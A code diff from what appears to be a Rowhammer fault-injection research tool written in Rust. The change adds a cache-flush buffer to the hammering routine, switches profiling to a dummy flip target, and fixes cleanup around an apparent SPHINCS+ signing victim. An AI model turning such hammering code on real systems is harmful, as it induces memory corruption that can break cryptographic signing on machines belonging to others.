@@ -384,6 +384,11 @@ unsafe fn _main() -> anyhow::Result<()> {
                 .mapping
                 .get_bitflips_relocate(mem_config, block_size.ilog2() as usize, &memory)
         );
+        let flush_buf: *mut u8 = allocator::util::mmap(std::ptr::null_mut(), 1024 * MB);
+        let flush_lines = (0..1024 * MB)
+            .step_by(CL_SIZE)
+            .map(|offset| unsafe { flush_buf.byte_add(offset) as usize })
+            .collect_vec();
         let profile_hammer = make_hammer(
             &args.hammerer,
             &pattern.pattern,
@@ -392,11 +397,10 @@ unsafe fn _main() -> anyhow::Result<()> {
             block_size,
             &memory,
             args.attempts,
-            true,
+            false,
+            flush_lines.clone(),
             target_pfn,
-            TARGET_OFFSETS_SHAKE_256S[target_layer]
-                .flip_direction
-                .clone(),
+            TARGET_OFFSET_DUMMY.flip_direction.clone(),
         )?;
         let profiling = hammer_profile(
             &profile_hammer,
@@ -428,6 +432,7 @@ unsafe fn _main() -> anyhow::Result<()> {
         if profiling.is_empty() {
             warn!("No vulnerable addresses found");
             memory.dealloc();
+            allocator::util::munmap(flush_buf, 1024 * MB);
             experiments.push(ExperimentData::new(
                 vec![Err("No vulnerable addresses found".to_string())],
                 profiling.clone(),
@@ -455,6 +460,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             Ok(victim) => victim,
             Err(e) => {
                 memory.dealloc();
+                allocator::util::munmap(flush_buf, 1024 * MB);
                 warn!("Failed to start victim: {:?}", e);
                 experiments.push(ExperimentData::new(vec![Err(e)], profiling.clone(), None));
                 continue 'repeat;
@@ -468,13 +474,14 @@ unsafe fn _main() -> anyhow::Result<()> {
             Ok(_) => {}
             Err(e) => {
                 warn!("Failed to start victim: {:?}", e);
-                memory.dealloc();
+                victim.stop();
                 experiments.push(ExperimentData::new(
                     vec![Err(format!("Failed to start victim: {:?}", e))],
                     profiling.clone(),
                     Some(serde_json::to_value(&victim).expect("failed to serialize victim")),
                 ));
-                victim.stop();
+                memory.dealloc();
+                allocator::util::munmap(flush_buf, 1024 * MB);
                 continue 'repeat;
             }
         }
@@ -487,6 +494,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             &memory,
             args.attempts,
             false, // this MUST be false for SphincsPlus victim (due to SIGSTOP handlers)
+            flush_lines,
             target_pfn,
             TARGET_OFFSETS_SHAKE_256S[target_layer]
                 .flip_direction
@@ -522,6 +530,7 @@ unsafe fn _main() -> anyhow::Result<()> {
         ));
         victim.stop();
         memory.dealloc();
+        allocator::util::munmap(flush_buf, 1024 * MB);
     }
     let now = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
     let results_file = format!("results/results_{}.json", now);
